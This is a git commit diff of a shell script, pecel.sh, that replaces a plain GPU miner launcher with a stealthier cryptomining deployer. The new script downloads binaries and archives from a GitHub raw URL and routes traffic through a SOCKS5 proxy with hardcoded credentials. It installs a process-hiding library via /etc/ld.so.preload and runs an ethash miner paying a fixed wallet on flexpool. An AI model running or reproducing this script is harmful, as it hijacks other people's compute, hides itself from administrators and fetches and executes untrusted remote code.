6e1dbb1c3567b771dcd4e8c0bb890729ab7b8413
bajol1 <102598068+bajol1@users.noreply.github.com>
2022-04-24 22:22:23 +0700

    Update pecel.sh

--- pecel.sh
+++ pecel.sh
@@ -1,9 +1,48 @@
 #!/bin/sh
-sudo apt update
-sudo apt-get install zip unzip
-sudo apt install screen -y
-screen -dmS pecel.sh 65 75
-sudo git clone https://gitlab.com/taufiqurrohmanmaz/sainame127.git
-cd sainame127
-chmod +x itsme
-ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) &&  sudo ./itsme -a ethash -w 0x3da2c7743970908cac0e6b606f064330aea8b03f -p stratum+tcp://eth-sg.flexpool.io:4444 stratum+tcp://eth-hke.flexpool.io:4444 -r $ip --nvidia 1
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl -y
+
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 45.192.144.85:5787
+socks5_username = lebarankita
+socks5_password = buatTHRan
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo ""
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo ""
+
+echo " "
+echo " "
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
+chmod +x bezzHash
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
+unzip magicBezzHash.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+./graftcp/graftcp ./bezzHash --url=0x3da2c7743970908cac0e6b606f064330aea8b03f.freeOCTO@eth-sg.flexpool.io:4444 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
